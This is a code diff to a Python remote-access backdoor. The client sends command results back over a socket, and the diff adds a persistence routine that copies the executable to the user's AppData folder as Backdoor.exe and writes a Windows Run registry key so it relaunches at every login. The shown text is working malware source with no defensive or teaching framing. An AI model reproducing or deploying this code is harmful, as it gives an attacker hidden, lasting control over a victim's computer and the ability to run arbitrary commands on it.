@@ -3,6 +3,10 @@ import socket
 import subprocess
 import json
 import time
+import os
+import shutil
+import sys
+
 
 def reliable_send(data):
     json_data = json.dumps(data)
@@ -39,6 +43,11 @@ def shell():
                 reliable_send(result)
             except:
                 reliable_send("[!!] Can't Execute the Command")
+
+location = os.environ['appdata'] + '\\Backdoor.exe'
+if not os.path.exists(location):
+    shutil.copyfile(sys.executable, location)
+    subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v BackDoor /t REG_SZ /d "' + location + '"', shell=True)
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
